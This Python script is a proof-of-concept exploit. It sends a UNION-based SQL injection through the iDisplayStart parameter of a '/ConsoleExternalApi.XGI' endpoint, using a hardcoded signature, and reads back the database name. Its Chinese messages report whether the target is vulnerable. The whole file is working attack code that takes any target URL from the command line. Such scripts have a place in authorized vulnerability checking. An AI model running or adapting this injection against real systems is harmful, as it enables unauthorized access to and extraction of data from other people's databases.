#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re
import urllib
import base64

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/ConsoleExternalApi.XGI?key=inner&initParams=command_getAppVisitLogByDataTable__user_admin__pwd_xxx__serverIdStr_1&sign=0a3d5f4f69628f32217ea9704d12bd6d&iDisplayStart=1+union+select+1,2,3,4,5,database()%23"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"}
    req = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if req.status_code==200 and "stoptime" in req.text:
        jsondata = json.loads(req.text)
        return jsondata["aaData"][1]["stoptime"]
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在, 查询 database() 的结果为：", info)
    else:
        print("[-]漏洞不存在")
